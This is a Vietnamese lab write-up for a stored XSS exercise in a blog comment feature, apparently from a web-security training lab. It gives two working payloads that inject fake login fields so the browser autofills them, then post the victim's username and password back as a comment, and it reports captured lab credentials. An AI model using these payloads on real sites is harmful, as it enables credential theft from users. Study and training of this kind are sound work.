Yêu cầu: Phòng thí nghiệm này chứa lỗ hổng XSS được lưu trữ trong chức năng bình luận blog. Người dùng nạn nhân được mô phỏng sẽ xem tất cả các bình luận sau khi chúng được đăng. Để giải quyết phòng thí nghiệm, hãy khai thác lỗ hổng để đánh cắp tên người dùng và mật khẩu của nạn nhân, sau đó sử dụng thông tin đăng nhập này để đăng nhập vào tài khoản của nạn nhân.

Giải pháp:
- Lab này có điểm nhập input trong phần commment của bài post, không tìm thấy tập lệnh script nào để xử lý comment trên trang. Nhưng có thể thêm script vào phần body của comment --> ta tấn công từ điểm vào này.
- Vì sử dụng burp thường --> mục tiêu của ta là lấy username và mật khẩu của nạn nhân --> ta sẽ thêm trường username và password vào trang để trang tự động điền --> sau đó thực hiện gửi request tới /post/comment password mới điền xong.
- Với FormData:
<input name=username >
<input name=password type=password onchange=execute()>
<script>
    function execute(){
        var token = document.getElementsByName('csrf')[0].value;
        var username = document.getElementsByName('username')[0].value;
        var password = document.getElementsByName('password')[0].value;
        var data = new FormData();
        data.append('csrf',token);
        data.append('postId',2);
        data.append('comment',username+'-'+password);
        data.append('name','victim');
        data.append('email','victim@gmail.com');
        data.append('website','https://google.com');
        fetch('/post/comment',{
            method: 'POST',
            mode: 'no-cors',
            body: data
        });
    }
</script>
--> lấy được: administrator-7d2ydjim1t76b0b21c9v
- Với body: 
<input name=username >
<input name=password type=password onchange=execute()>
<script>
    function execute(){
        var token = document.getElementsByName('csrf')[0].value;
        var username = document.getElementsByName('username')[0].value;
        var password = document.getElementsByName('password')[0].value;
        fetch('/post/comment',{
            method: 'POST',
            mode: 'no-cors', 
            headers: {'Content-Type':'application/x-www-form-urlencoded'},
            body: 'csrf=' + encodeURIComponent(token) + '&postId=2&comment=' + encodeURIComponent(username+'-'+password) + '&name=victim&email=victim@gmail.com&website=https://google.com'
        });
    }
</script>
--> lấy được.
